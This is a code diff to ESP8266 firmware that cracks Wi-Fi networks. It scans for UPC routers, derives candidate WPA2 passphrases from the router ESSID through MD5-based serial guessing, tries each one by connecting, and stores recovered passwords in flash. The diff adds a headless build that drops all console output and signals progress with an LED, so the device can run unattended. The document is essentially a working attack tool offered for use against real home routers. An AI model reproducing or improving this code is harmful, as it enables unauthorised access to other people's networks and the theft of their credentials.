@@ -40,13 +40,19 @@ typedef struct {
     uint8_t password[9];
 } saved_ap_t;
 
+#ifdef MODE_HEADLESS
+#define printf(...)
+#else
+#define printf os_printf
+#endif
+
 ICACHE_FLASH_ATTR
 static void
 scan(os_event_t *events)
 {
     if(state == SCANNING){
         if(aps_found == MAX_APS){
-            os_printf("Flushing AP buffer...\n");
+            printf("Flushing AP buffer...\n");
             // flush AP buffer (found passwords will be re-loaded from flash)
             aps_found = 0;
             memset(aps, 0x0, sizeof(aps));
@@ -54,7 +60,7 @@ scan(os_event_t *events)
         state = TARGETING;
         wifi_station_scan(NULL, targets_found);
     } else {
-        os_printf("Error: not in scanning state\n");
+        printf("Error: not in scanning state\n");
     }
 }
 
@@ -66,7 +72,7 @@ static void load_password(size_t ap_to_crack){
         spi_flash_read(USER_FLASH_START + (saved_aps*sizeof(saved_ap_t)), (uint32_t*) &saved_ap, sizeof(saved_ap_t));
         if(memcmp(saved_ap.bssid, aps[ap_to_crack].bssid, 6) == 0){
             memcpy(aps[ap_to_crack].password, saved_ap.password, 8);
-            os_printf("Loaded saved password %s for ESSID %s in slot %u\n", aps[ap_to_crack].password, aps[ap_to_crack].essid, saved_aps);
+            printf("Loaded saved password %s for ESSID %s in slot %u\n", aps[ap_to_crack].password, aps[ap_to_crack].essid, saved_aps);
             break;
         }
         saved_aps++;
@@ -90,15 +96,15 @@ targets_found(void* arg, STATUS status){
                     ap_to_crack = i;
                 }
                 found = true;
-                os_printf("Saw known AP: %02x:%02x:%02x:%02x:%02x:%02x %32s (%d dB)", bss_link->bssid[0], bss_link->bssid[1], bss_link->bssid[2], bss_link->bssid[3], bss_link->bssid[4], bss_link->bssid[5], bss_link->ssid, bss_link->rssi);
+                printf("Saw known AP: %02x:%02x:%02x:%02x:%02x:%02x %32s (%d dB)", bss_link->bssid[0], bss_link->bssid[1], bss_link->bssid[2], bss_link->bssid[3], bss_link->bssid[4], bss_link->bssid[5], bss_link->ssid, bss_link->rssi);
                 if(aps[i].password[0]){
-                    os_printf(" (password: %s )", aps[i].password);
+                    printf(" (password: %s )", aps[i].password);
                 }
-                os_printf("\n");
+                printf("\n");
             }
         }
         if(!found && aps_found < MAX_APS){
-            os_printf("Found new AP: %02x:%02x:%02x:%02x:%02x:%02x %32s (%d dB)\n", bss_link->bssid[0], bss_link->bssid[1], bss_link->bssid[2], bss_link->bssid[3], bss_link->bssid[4], bss_link->bssid[5], bss_link->ssid, bss_link->rssi);
+            printf("Found new AP: %02x:%02x:%02x:%02x:%02x:%02x %32s (%d dB)\n", bss_link->bssid[0], bss_link->bssid[1], bss_link->bssid[2], bss_link->bssid[3], bss_link->bssid[4], bss_link->bssid[5], bss_link->ssid, bss_link->rssi);
             memcpy(aps[aps_found].bssid, bss_link->bssid, 6);
             memcpy(aps[aps_found].essid, bss_link->ssid, 32);
             aps[aps_found].target = 0;
@@ -119,13 +125,14 @@ targets_found(void* arg, STATUS status){
         bss_link = bss_link->next.stqe_next;
     }
     if(ap_to_crack <= MAX_APS){
-        os_printf("Found target ESSID %s...\n", aps[ap_to_crack].essid);
+        printf("Found target ESSID %s...\n", aps[ap_to_crack].essid);
+        GPIO_OUTPUT_SET(LED_PIN, 0);
         if(aps[ap_to_crack].candidate_passwords){
-            os_printf("Connecting to ESSID %s...\n", aps[ap_to_crack].essid);
+            printf("Connecting to ESSID %s...\n", aps[ap_to_crack].essid);
             state = CONNECTING;
             system_os_post(PRIO_TEST, 0, (os_param_t) ap_to_crack);
         } else {
-            os_printf("Generating candidate passwords for ESSID %s...\n", aps[ap_to_crack].essid);
+            printf("Generating candidate passwords for ESSID %s...\n", aps[ap_to_crack].essid);
             state = CRACKING;
             system_os_post(PRIO_CRACK, 0, (os_param_t) ap_to_crack);
         }
@@ -144,12 +151,12 @@ static void save_password(size_t ap_to_crack){
         saved_aps++;
     } while(saved_ap.password[0] != 0xff && (saved_aps < (USER_FLASH_SIZE / sizeof(saved_ap_t))));
     if(saved_aps < (USER_FLASH_SIZE / sizeof(saved_ap_t))){
-        os_printf("Saving password %s for ESSID %s in slot %u\n", aps[ap_to_crack].password, aps[ap_to_crack].essid, saved_aps - 1);
+        printf("Saving password %s for ESSID %s in slot %u\n", aps[ap_to_crack].password, aps[ap_to_crack].essid, saved_aps - 1);
         memcpy(saved_ap.bssid, aps[ap_to_crack].bssid, 6);
         memcpy(saved_ap.password, aps[ap_to_crack].password, 8);
         spi_flash_write(USER_FLASH_START + (saved_aps-1)*sizeof(saved_ap_t), (uint32_t*) &saved_ap, sizeof(saved_ap_t));
     } else {
-        os_printf("User flash area is full!\n");
+        printf("User flash area is full!\n");
     }
 }
 
@@ -158,19 +165,19 @@ static void test_passwords(os_event_t *events){
     size_t ap_to_crack = (size_t) events->par;
 
     if(state != CONNECTING && state != DISCONNECTING){
-        os_printf("Error: not in connecting state\n");
+        printf("Error: not in connecting state\n");
         return;
     }
 
     if(ap_timeouts == MAX_TRIES){
-        os_printf("AP not reachable for %u tries, aborting\n", MAX_TRIES);
+        printf("AP not reachable for %u tries, aborting\n", MAX_TRIES);
         state = DISCONNECTING;
     }
 
     if(state == CONNECTING){
         if(aps[ap_to_crack].candidate_passwords){
             if(!*(aps[ap_to_crack].candidate_passwords+(8*aps[ap_to_crack].current_password))){
-                os_printf("Finished testing passwords\n");
+                printf("Finished testing passwords\n");
                 // done with testing, go back to scanning
                 state = DISCONNECTING;
                 memcpy(aps[ap_to_crack].password, "UNKNOWN", 7);
@@ -181,7 +188,7 @@ static void test_passwords(os_event_t *events){
             }
 
         } else {
-            os_printf("Error: no candidate passwords found!\n");
+            printf("Error: no candidate passwords found!\n");
             return;
         }
     }
@@ -191,6 +198,7 @@ static void test_passwords(os_event_t *events){
         state = SCANNING;
         ap_timeouts = 0;
         system_os_post(PRIO_SCAN, 0, 0 );
+        GPIO_OUTPUT_SET(LED_PIN, 1);
         return;
     }
 
@@ -199,7 +207,7 @@ static void test_passwords(os_event_t *events){
         default:
             break;
         case STATION_WRONG_PASSWORD:
-            os_printf("Wrong password!\n");
+            printf("Wrong password!\n");
             aps[ap_to_crack].current_password++;
             // fall through
         case STATION_IDLE: {
@@ -210,7 +218,7 @@ static void test_passwords(os_event_t *events){
             memcpy(config.password, aps[ap_to_crack].candidate_passwords+(8*aps[ap_to_crack].current_password), 8);
             memcpy(config.bssid, aps[ap_to_crack].bssid, 6);
             config.bssid_set = 0;
-            os_printf("Connecting to %s with password %s\n", config.ssid, config.password);
+            printf("Connecting to %s with password %s\n", config.ssid, config.password);
             wifi_station_set_config(&config);
             wifi_station_connect();
             break;
@@ -221,18 +229,18 @@ static void test_passwords(os_event_t *events){
             break;
         case STATION_CONNECT_FAIL:
             wifi_station_disconnect();
-            os_printf("Error connecting... retrying now\n");
+            printf("Error connecting... retrying now\n");
             ap_timeouts++;
             wifi_station_connect();
             break;
         case STATION_GOT_IP: {
             memcpy(aps[ap_to_crack].password, aps[ap_to_crack].candidate_passwords+(8*aps[ap_to_crack].current_password), 8);
-            os_printf("Found valid password for %s: %s\n", aps[ap_to_crack].essid, aps[ap_to_crack].password);
+            printf("Found valid password for %s: %s\n", aps[ap_to_crack].essid, aps[ap_to_crack].password);
             aps[ap_to_crack].target = 0;
             os_free(aps[ap_to_crack].candidate_passwords);
             aps[ap_to_crack].candidate_passwords = NULL;
             save_password(ap_to_crack);
-            os_printf("Saved password to user flash\n");
+            printf("Saved password to user flash\n");
             // no need to test more
             state = DISCONNECTING;
             break;
@@ -244,8 +252,14 @@ static void test_passwords(os_event_t *events){
 ICACHE_FLASH_ATTR
 void user_init()
 {
+#ifdef MODE_HEADLESS
+    // set up LED
+    gpio_init();
+    GPIO_OUTPUT_SET(LED_PIN, 1);
+#else
     uart_init(115200, 115200);
     os_delay_us(100);
+#endif
 
     wifi_set_opmode( 0x1 );
     wifi_station_set_auto_connect(false);
@@ -367,11 +381,11 @@ static void crack(os_event_t *events){
     MD5_CTX ctx;
 
     if(state != CRACKING){
-        os_printf("Error: not in cracking state\n");
+        printf("Error: not in cracking state\n");
         return;
     }
     if(aps[ap_to_crack].password[0]){
-        os_printf("Error: Already cracked this AP (%s)\n", aps[ap_to_crack].essid);
+        printf("Error: Already cracked this AP (%s)\n", aps[ap_to_crack].essid);
         return;
     }
 
@@ -380,7 +394,7 @@ static void crack(os_event_t *events){
 
         // breaks the rules by doing a lot of work all at once
         for (buf[0] = 0; buf[0] <= MAX0; buf[0]++) {
-            os_printf("Cracking ESSID UPC%07d... %u/%u\n", aps[ap_to_crack].target, buf[0], MAX0);
+            printf("Cracking ESSID UPC%07d... %u/%u\n", aps[ap_to_crack].target, buf[0], MAX0);
         for (buf[1] = 0; buf[1] <= MAX1; buf[1]++)
         for (buf[2] = 0; buf[2] <= MAX2; buf[2]++)
         for (buf[3] = 0; buf[3] <= MAX3; buf[3]++) {
@@ -415,7 +429,7 @@ static void crack(os_event_t *events){
             MD5_Final(h2, &ctx);
 
             hash2pass(h2, pass);
-            os_printf("  -> WPA2 phrase for '%s' = '%s'\n", serial, pass);
+            printf("  -> WPA2 phrase for '%s' = '%s'\n", serial, pass);
             memcpy(candidate_passwords[cnt], pass, 8);
 
             cnt++;
@@ -429,13 +443,13 @@ static void crack(os_event_t *events){
             memcpy(aps[ap_to_crack].candidate_passwords+(8*i), candidate_passwords[i], 8);
         }
 
-        os_printf("Testing generated passwords\n");
+        printf("Testing generated passwords\n");
 
         // go back to scanning
         state = SCANNING;
         system_os_post(PRIO_SCAN, 0, 0);
     } else {
-        os_printf("Error: Not a target\n");
+        printf("Error: Not a target\n");
         return;
     }
 }
